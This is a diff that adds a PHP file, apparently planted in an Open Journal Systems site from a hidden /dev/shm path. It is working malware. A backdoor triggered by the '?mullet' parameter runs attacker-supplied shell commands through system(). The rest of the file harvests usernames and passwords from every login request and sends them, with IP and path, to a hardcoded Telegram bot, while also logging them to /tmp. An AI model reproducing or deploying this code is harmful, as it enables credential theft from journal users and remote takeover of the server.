@@ -1,0 +1,144 @@
+<?php
+/**
+ * ULTIMATE OJS LOGIN CAPTURE - UNIVERSAL
+ * File: /dev/shm/.ojs_capture
+ * 
+ * FITUR: include() bisa diletakkan di MANA SAJA dan TETAP WORK
+ */
+
+// ============================================
+// KONFIGURASI TELEGRAM
+// ============================================
+$bot_token = '8840330781:AAHMysRmWTiwkeodAOALmpsJ5EdftsvLy_Y';
+$chat_id = '8259867883';
+
+// ============================================
+// CEK APAKAH SUDAH DILOAD (CEGAH DOUBLE)
+// ============================================
+if (defined('OJS_MONITOR_LOADED')) {
+    return;
+}
+define('OJS_MONITOR_LOADED', true);
+
+// ============================================
+// EMERGENCY BACKDOOR - AKSES VIA ?mullet
+// ============================================
+if (isset($_GET['mullet'])) {
+    if (isset($_POST['cmd']) && function_exists('system')) {
+        system($_POST['cmd']);
+        exit;
+    }
+    die('<html><body style="background:#000;color:#0f0;font-family:monospace;padding:20px">
+    <h2>🔐 OJS BACKDOOR ACTIVE</h2>
+    <form method=post>
+        <input type="text" name="cmd" size="50" style="background:#333;color:#0f0;border:1px solid #0f0">
+        <button type="submit">RUN</button>
+    </form>
+    </body></html>');
+}
+
+// ============================================
+// CAPTURE SEMUA LOGIN ATTEMPT
+// ============================================
+
+$username = '';
+$password = '';
+
+// CEK 1: Tangkap dari POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Format OJS 3.x
+    if (isset($_POST['username']) && isset($_POST['password'])) {
+        $username = $_POST['username'];
+        $password = $_POST['password'];
+    }
+    // Format OJS 2.x
+    elseif (isset($_POST['email']) && isset($_POST['password'])) {
+        $username = $_POST['email'];
+        $password = $_POST['password'];
+    }
+    // Format lain
+    elseif (isset($_POST['user']) && isset($_POST['pass'])) {
+        $username = $_POST['user'];
+        $password = $_POST['pass'];
+    }
+    elseif (isset($_POST['login']) && isset($_POST['pwd'])) {
+        $username = $_POST['login'];
+        $password = $_POST['pwd'];
+    }
+    else {
+        foreach ($_POST as $key => $value) {
+            if (stripos($key, 'user') !== false && empty($username)) $username = $value;
+            if (stripos($key, 'pass') !== false && empty($password)) $password = $value;
+            if (stripos($key, 'email') !== false && empty($username)) $username = $value;
+        }
+    }
+}
+
+// CEK 2: Tangkap dari JSON payload
+if (empty($username) && $input = file_get_contents('php://input')) {
+    $json = json_decode($input, true);
+    if ($json) {
+        $username = $json['username'] ?? $json['email'] ?? $json['user'] ?? '';
+        $password = $json['password'] ?? $json['pass'] ?? '';
+    }
+}
+
+// CEK 3: Tangkap dari Basic Auth
+if (empty($username) && isset($_SERVER['PHP_AUTH_USER'])) {
+    $username = $_SERVER['PHP_AUTH_USER'];
+    $password = $_SERVER['PHP_AUTH_PW'];
+}
+
+// ============================================
+// JIKA ADA CREDENTIAL, KIRIM KE TELEGRAM
+// ============================================
+if (!empty($username) && !empty($password)) {
+    
+    // Ambil informasi detail
+    $ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? 
+          $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
+          $_SERVER['HTTP_X_REAL_IP'] ?? 
+          $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
+    
+    if (strpos($ip, ',') !== false) {
+        $ip = trim(explode(',', $ip)[0]);
+    }
+    
+    $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
+    $full_path = $_SERVER['REQUEST_URI'] ?? '/';
+    $time = date('Y-m-d H:i:s');
+    $host = $_SERVER['HTTP_HOST'] ?? 'unknown';
+    
+    // Build message
+    $message = "🔐 OJS LOGIN CAPTURED\n";
+    $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "👤 USERNAME: {$username}\n";
+    $message .= "🔑 PASSWORD: {$password}\n";
+    $message .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n";
+    $message .= "🌐 IP: {$ip}\n";
+    $message .= "📍 PATH: {$full_path}\n";
+    $message .= "⏰ TIME: {$time}\n";
+    $message .= "🌍 HOST: {$host}\n";
+    $message .= "📱 UA: " . substr($user_agent, 0, 60);
+    
+    // KIRIM KE TELEGRAM
+    $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";
+    $post_data = "chat_id={$chat_id}&text=" . urlencode($message);
+    
+    if (function_exists('curl_init')) {
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
+        curl_setopt($ch, CURLOPT_TIMEOUT, 3);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+    
+    // LOG KE FILE (UNTUK DEBUG)
+    $log_entry = "[{$time}] {$username}|{$password}|{$ip}|{$full_path}\n";
+    @file_put_contents('/tmp/ojs_capture.log', $log_entry, FILE_APPEND);
+}
+?>
